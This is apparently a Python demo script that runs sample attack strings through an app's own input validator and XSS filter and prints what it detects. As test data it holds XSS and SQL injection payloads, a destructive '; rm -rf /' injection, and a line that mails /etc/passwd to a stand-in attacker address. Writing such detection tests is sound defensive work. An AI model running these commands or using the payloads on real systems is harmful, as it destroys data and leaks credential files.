#!/usr/bin/env python3
"""
Security Test Demo Script

This script demonstrates the security testing capabilities by running
a subset of tests and showing the results.
"""

import sys
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

from app.security.advanced_validation import AdvancedInputValidator, ValidationResult, InputType
from app.security.advanced_xss import AdvancedXSSProtection, Context, ThreatLevel

def demo_input_validation():
    """Demonstrate input validation capabilities."""
    print("🔒 Security Input Validation Demo")
    print("=" * 50)
    
    validator = AdvancedInputValidator()
    
    # Test cases
    test_cases = [
        ("Normal text", "Hello, this is a normal comment"),
        ("Email", "user@example.com"),
        ("XSS Attack", "<script>alert('XSS')</script>"),
        ("SQL Injection", "'; DROP TABLE users; --"),
        ("Command Injection", "; rm -rf /"),
        ("Encoded XSS", "%3Cscript%3Ealert('XSS')%3C/script%3E"),
    ]
    
    for test_name, test_input in test_cases:
        result = validator.validate_input(test_input)
        
        # Color coding for results
        if result.result == ValidationResult.SAFE:
            status_color = "\033[92m"  # Green
            status = "✅ SAFE"
        elif result.result == ValidationResult.SUSPICIOUS:
            status_color = "\033[93m"  # Yellow
            status = "⚠️  SUSPICIOUS"
        elif result.result == ValidationResult.MALICIOUS:
            status_color = "\033[91m"  # Red
            status = "🚨 MALICIOUS"
        else:  # BLOCKED
            status_color = "\033[95m"  # Magenta
            status = "🛑 BLOCKED"
        
        reset_color = "\033[0m"
        
        print(f"\n{test_name}:")
        print(f"  Input: {test_input[:50]}{'...' if len(test_input) > 50 else ''}")
        print(f"  Result: {status_color}{status}{reset_color}")
        print(f"  Threat Score: {result.threat_score:.1f}")
        print(f"  Confidence: {result.confidence:.1%}")
        
        if result.patterns_detected:
            print(f"  Patterns: {', '.join(result.patterns_detected)}")
        
        if result.sanitized_input and result.sanitized_input != test_input:
            print(f"  Sanitized: {result.sanitized_input[:50]}{'...' if len(result.sanitized_input) > 50 else ''}")

def demo_xss_protection():
    """Demonstrate XSS protection capabilities."""
    print("\n\n🛡️  XSS Protection Demo")
    print("=" * 50)
    
    xss_protection = AdvancedXSSProtection()
    
    xss_test_cases = [
        ("Basic Script", "<script>alert('XSS')</script>"),
        ("Image Tag", "<img src=x onerror=alert('XSS')>"),
        ("SVG Attack", "<svg onload=alert('XSS')>"),
        ("Event Handler", "<div onclick='alert(1)'>Click me</div>"),
        ("CSS Attack", "<style>@import 'javascript:alert(1)';</style>"),
        ("Safe HTML", "<p>This is <strong>safe</strong> content</p>"),
    ]
    
    for test_name, test_content in xss_test_cases:
        analysis = xss_protection.analyze_content(test_content, Context.HTML)
        
        # Color coding for threat levels
        if analysis.threat_level == ThreatLevel.LOW:
            threat_color = "\033[92m"  # Green
            threat_emoji = "✅"
        elif analysis.threat_level == ThreatLevel.MEDIUM:
            threat_color = "\033[93m"  # Yellow
            threat_emoji = "⚠️"
        elif analysis.threat_level == ThreatLevel.HIGH:
            threat_color = "\033[91m"  # Red
            threat_emoji = "🚨"
        else:  # CRITICAL
            threat_color = "\033[95m"  # Magenta
            threat_emoji = "🔥"
        
        reset_color = "\033[0m"
        
        print(f"\n{test_name}:")
        print(f"  Content: {test_content}")
        print(f"  Threat Level: {threat_color}{threat_emoji} {analysis.threat_level.name}{reset_color}")
        print(f"  Score: {analysis.score:.1f}")
        
        if analysis.patterns_detected:
            print(f"  Patterns: {', '.join(analysis.patterns_detected)}")
        
        if analysis.sanitized_content != test_content:
            print(f"  Sanitized: {analysis.sanitized_content}")

def demo_performance_test():
    """Demonstrate performance testing."""
    print("\n\n⚡ Performance Demo")
    print("=" * 50)
    
    import time
    
    validator = AdvancedInputValidator()
    
    # Performance test with various input sizes
    test_sizes = [100, 1000, 5000]
    
    for size in test_sizes:
        test_input = "A" * size
        
        # Measure validation time
        start_time = time.time()
        result = validator.validate_input(test_input)
        end_time = time.time()
        
        processing_time = (end_time - start_time) * 1000  # Convert to milliseconds
        
        print(f"\nInput size: {size} characters")
        print(f"Processing time: {processing_time:.2f}ms")
        print(f"Result: {result.result.value}")
        
        # Performance assertion
        if processing_time > 50:  # More than 50ms is concerning
            print("  ⚠️  Performance warning: Processing time is high")
        else:
            print("  ✅ Performance: Good")

def demo_attack_simulation():
    """Demonstrate attack simulation."""
    print("\n\n🎯 Attack Simulation Demo")
    print("=" * 50)
    
    validator = AdvancedInputValidator()
    
    # Common attack vectors
    attack_vectors = [
        ("Script Injection", "<script>alert('Hacked!')</script>"),
        ("SQL Injection", "1' OR '1'='1' UNION SELECT password FROM users--"),
        ("Command Injection", "; cat /etc/passwd | mail hacker@evil.com"),
        ("XSS via Image", "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>"),
        ("Polyglot Attack", "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"),
    ]
    
    detected_count = 0
    
    for attack_name, attack_payload in attack_vectors:
        result = validator.validate_input(attack_payload)
        
        is_detected = result.result in [
            ValidationResult.SUSPICIOUS,
            ValidationResult.MALICIOUS,
            ValidationResult.BLOCKED
        ]
        
        if is_detected:
            detected_count += 1
            status = "\033[92m✅ DETECTED\033[0m"
        else:
            status = "\033[91m❌ MISSED\033[0m"
        
        print(f"\n{attack_name}: {status}")
        print(f"  Payload: {attack_payload[:60]}{'...' if len(attack_payload) > 60 else ''}")
        print(f"  Threat Score: {result.threat_score:.1f}")
        print(f"  Result: {result.result.value}")
    
    detection_rate = detected_count / len(attack_vectors)
    print(f"\n📊 Detection Summary:")
    print(f"  Detected: {detected_count}/{len(attack_vectors)}")
    print(f"  Detection Rate: {detection_rate:.1%}")
    
    if detection_rate >= 0.8:
        print("  ✅ Excellent detection rate!")
    elif detection_rate >= 0.6:
        print("  ⚠️  Good detection rate")
    else:
        print("  🚨 Detection rate needs improvement")

def main():
    """Run the security test demo."""
    print("🔒 NextProperty AI Security System Demo")
    print("=" * 60)
    print("This demo showcases the security testing capabilities")
    print("of the NextProperty AI application.\n")
    
    try:
        # Run demos
        demo_input_validation()
        demo_xss_protection()
        demo_performance_test()
        demo_attack_simulation()
        
        print("\n\n🎉 Demo Complete!")
        print("=" * 60)
        print("To run the full security test suite:")
        print("  python run_security_tests.py")
        print("\nTo run specific tests:")
        print("  python run_security_tests.py --suite tests/test_security_comprehensive.py")
        print("\nTo generate reports:")
        print("  python run_security_tests.py --html")
        
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        print("This might indicate missing dependencies or configuration issues.")
        print("Please ensure all security modules are properly installed.")
        return 1
    
    return 0

if __name__ == '__main__':
    sys.exit(main())
